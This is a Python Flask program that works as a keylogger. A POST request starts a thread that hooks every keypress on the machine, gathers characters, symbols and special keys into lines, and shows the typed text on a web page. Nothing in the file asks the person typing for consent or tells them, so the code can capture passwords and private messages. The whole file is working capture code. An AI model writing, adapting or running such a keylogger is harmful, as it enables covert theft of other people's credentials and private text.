from flask import Flask, render_template
import threading
import keyboard

app = Flask(__name__)

# Set of sensitive keys and symbols
sensitive_keys = {'enter', 'backspace', 'tab', 'esc', 'shift', 'ctrl', 'alt', 'caps lock', 'space'}
sensitive_symbols = set('!@#$%^&*()_+{}:"<>?|[]\\;,./`~')

# Global variables to store typed text and words
port = 5143
typed_text = ""
typed_words = []
typed_text2 = ""
typed_words2 = []
message = message2 = message3 = None
lock = threading.Lock()

# This function is now a simple pass-through
def remove_duplicates(s):
    return s  # Just return the string as is, without any modifications

@app.route('/')
def index():
    global message3, message2, message
    with lock:
        message3 = "Monitoring started"
    return render_template('htmlt.html', message3=message3, message2=message2, message=message)

@app.route('/monitor', methods=['POST'])
def monitor_keys():
    global message, message2, message3

    # Function to handle key press event
    def on_press(e):
        global typed_text, typed_words, message2, message, typed_text2, typed_words2
        with lock:
            key = e.name
            if key.isalnum() or key in sensitive_symbols:
                typed_text += key
                typed_text2 += key
                print(f"Char added: {key}")  # Debugging line
            elif key == 'space':
                typed_text += ' '
                typed_text2 += ' '
                print("Space added")  # Debugging line
            if key in sensitive_keys:
                typed_text += f" [{key}]"
                print(f"Sensitive key pressed: {key}")  # Debugging line
            
            if key == 'enter':
                if typed_text:
                    typed_words.append(typed_text)  # Append the text before clearing
                    typed_text = ""  # Clear typed_text
                    message2 = "<br>".join(typed_words)  # Update message2
                    print(f"Typed Words: {message2}")  # Debugging line

                if typed_text2:
                    typed_words2.append(typed_text2)  # Append the text before clearing
                    typed_text2 = ""  # Clear typed_text2
                    message = "<br>".join(typed_words2)  # Update message
                    print(f"Typed Words 2: {message}")  # Debugging line

    # Start the key listener
    def start_key_listener():
        keyboard.on_press(on_press)
        keyboard.wait('esc')  # Stop listening when 'esc' is pressed

    # Start key listener thread if it's not already running
    if not hasattr(monitor_keys, 'key_listener_thread') or not monitor_keys.key_listener_thread.is_alive():
        monitor_keys.key_listener_thread = threading.Thread(target=start_key_listener)
        monitor_keys.key_listener_thread.start()

    return '', 204  # No Content response


